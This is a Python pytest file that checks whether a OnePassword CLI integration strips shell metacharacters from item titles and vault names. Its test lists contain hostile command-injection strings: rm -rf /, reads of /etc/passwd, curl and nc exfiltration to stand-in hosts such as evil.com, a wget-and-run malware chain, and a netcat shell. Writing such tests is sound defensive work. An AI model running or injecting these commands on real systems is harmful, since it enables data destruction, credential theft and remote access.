#!/usr/bin/env python3
"""
Tests for OnePassword integration sanitization

Tests the input validation and sanitization for OnePassword CLI commands
to prevent command injection vulnerabilities.
"""

import pytest
from unittest.mock import patch, MagicMock

# Import the classes we need to test
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from cproj import OnePasswordIntegration


class TestOnePasswordSanitization:
    """Test OnePassword argument sanitization"""

    @pytest.mark.security
    def test_sanitize_op_argument_safe_characters(self):
        """Test that safe characters are preserved"""
        safe_inputs = [
            "normal-title",
            "test_name",
            "project.config",
            "MyProject123",
            "simple",
            "with spaces",
            "dash-underscore_dot.combo",
        ]

        for safe_input in safe_inputs:
            result = OnePasswordIntegration._sanitize_op_argument(safe_input)
            # Should preserve alphanumeric, hyphens, underscores, dots, and spaces
            expected = ''.join(c for c in safe_input if c.isalnum() or c in '-_. ')
            assert result == expected

    @pytest.mark.security
    def test_sanitize_op_argument_removes_dangerous_characters(self):
        """Test that dangerous characters are removed"""
        dangerous_inputs = [
            "title; rm -rf /",
            "title && cat /etc/passwd",
            "title | nc attacker.com 4444",
            "title`id`",
            "title$(whoami)",
            "title'drop table;'",
            'title"evil"',
            "title\\x00\\x01",
            "title\n\r\t",
            "title&lt;script&gt;alert()&lt;/script&gt;",
            "title; curl http://evil.com/steal?data=`cat /etc/passwd`",
        ]

        for dangerous_input in dangerous_inputs:
            result = OnePasswordIntegration._sanitize_op_argument(dangerous_input)

            # Should not contain any shell metacharacters
            dangerous_chars = [';', '&', '|', '`', '$', "'", '"', '\\', '\n', '\r', '\t', '<', '>', '(', ')']
            for char in dangerous_chars:
                assert char not in result, f"Dangerous character '{char}' found in result: {result}"

    @pytest.mark.security
    def test_sanitize_op_argument_edge_cases(self):
        """Test edge cases for sanitization"""
        edge_cases = [
            ("", ""),  # Empty string
            ("   ", "   "),  # Only spaces
            ("123", "123"),  # Only numbers
            ("ABC", "ABC"),  # Only letters
            ("---", "---"),  # Only hyphens
            ("...", "..."),  # Only dots
            ("___", "___"),  # Only underscores
        ]

        for input_val, expected in edge_cases:
            result = OnePasswordIntegration._sanitize_op_argument(input_val)
            assert result == expected

    @pytest.mark.security
    def test_sanitize_op_argument_non_string_input(self):
        """Test handling of non-string input"""
        non_string_inputs = [
            123,
            None,
            [],
            {},
            True,
            False,
        ]

        for input_val in non_string_inputs:
            result = OnePasswordIntegration._sanitize_op_argument(input_val)
            # Should convert to string and then sanitize
            expected = ''.join(c for c in str(input_val) if c.isalnum() or c in '-_. ')
            assert result == expected

    @pytest.mark.security
    @patch('subprocess.run')
    @patch('shutil.which')
    def test_store_secret_uses_sanitized_arguments(self, mock_which, mock_run):
        """Test that store_secret uses sanitized arguments"""
        # Mock 1Password CLI availability
        mock_which.return_value = '/usr/bin/op'

        # Create separate mock objects to control their behavior independently
        mock_run.side_effect = [
            MagicMock(stdout="", stderr="", returncode=0),  # For is_available check
            MagicMock(stdout="", stderr="", returncode=0),  # For store_secret call
        ]

        # Test with potentially dangerous input
        dangerous_title = "project; rm -rf /"
        dangerous_vault = "vault && curl evil.com"
        safe_password = "secure_password123"

        result = OnePasswordIntegration.store_secret(dangerous_title, safe_password, dangerous_vault)

        # Should have called subprocess twice (once for availability check, once for store)
        assert mock_run.call_count == 2

        # Get the second call (the store_secret call)
        store_call_args = mock_run.call_args_list[1][0][0]  # Get the command arguments

        # Verify the command structure
        assert store_call_args[0] == 'op'
        assert store_call_args[1] == 'item'
        assert store_call_args[2] == 'create'
        assert store_call_args[3] == '--category=password'

        # Verify sanitized title
        expected_title = ''.join(c for c in dangerous_title if c.isalnum() or c in '-_. ')
        assert f'--title={expected_title}' in store_call_args

        # Verify sanitized vault
        expected_vault = ''.join(c for c in dangerous_vault if c.isalnum() or c in '-_. ')
        assert f'--vault={expected_vault}' in store_call_args

        # Password should be passed as is (it's not shell-escaped)
        assert f'password={safe_password}' in store_call_args

    @pytest.mark.security
    @patch('subprocess.run')
    @patch('shutil.which')
    def test_store_secret_rejects_empty_inputs(self, mock_which, mock_run):
        """Test that store_secret rejects empty or None inputs"""
        mock_which.return_value = '/usr/bin/op'
        # Mock the is_available check to return successfully
        mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)

        # Reset the mock before each test
        mock_run.reset_mock()

        # Test empty/None title
        result = OnePasswordIntegration.store_secret("", "password")
        assert result is None
        # Should not call store operation, only availability check
        assert mock_run.call_count <= 1

        mock_run.reset_mock()
        result = OnePasswordIntegration.store_secret(None, "password")
        assert result is None
        assert mock_run.call_count <= 1

        # Test empty/None password
        mock_run.reset_mock()
        result = OnePasswordIntegration.store_secret("title", "")
        assert result is None
        assert mock_run.call_count <= 1

        mock_run.reset_mock()
        result = OnePasswordIntegration.store_secret("title", None)
        assert result is None
        assert mock_run.call_count <= 1

    @pytest.mark.security
    @patch('subprocess.run')
    @patch('shutil.which')
    def test_store_secret_handles_subprocess_errors(self, mock_which, mock_run):
        """Test that store_secret handles subprocess errors gracefully"""
        mock_which.return_value = '/usr/bin/op'

        # Simulate subprocess failure
        from subprocess import CalledProcessError, TimeoutExpired

        # Test CalledProcessError
        mock_run.side_effect = CalledProcessError(1, 'op')
        result = OnePasswordIntegration.store_secret("title", "password")
        assert result is None

        # Test TimeoutExpired
        mock_run.side_effect = TimeoutExpired('op', 10)
        result = OnePasswordIntegration.store_secret("title", "password")
        assert result is None

    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test comprehensive command injection prevention"""
        # Common command injection patterns
        injection_attempts = [
            "title; cat /etc/passwd",
            "title && wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh",
            "title | nc -l -p 4444 -e /bin/sh",
            "title`curl http://evil.com/?stolen=$(cat /etc/passwd | base64)`",
            "title$(nc evil.com 4444 < /etc/passwd)",
            "title' || curl http://evil.com/exfiltrate?data='$(cat /etc/passwd)'",
            'title" && rm -rf / --no-preserve-root',
            "title\\x00; /bin/sh",  # Null byte injection
            "title\n/bin/sh\n",     # Newline injection
            "title\r\n/bin/sh\r\n", # CRLF injection
        ]

        for injection_attempt in injection_attempts:
            sanitized = OnePasswordIntegration._sanitize_op_argument(injection_attempt)

            # Should not contain any dangerous shell metacharacters
            dangerous_patterns = [';', '&&', '||', '|', '`', '$', '$(', "'", '"', '\\x', '\n', '\r', '<', '>']
            for pattern in dangerous_patterns:
                assert pattern not in sanitized, f"Dangerous pattern '{pattern}' found in sanitized output: {sanitized}"

            # Should only contain safe characters
            for char in sanitized:
                assert char.isalnum() or char in '-_. ', f"Unsafe character '{char}' found in sanitized output: {sanitized}"


if __name__ == '__main__':
    pytest.main([__file__, '-v'])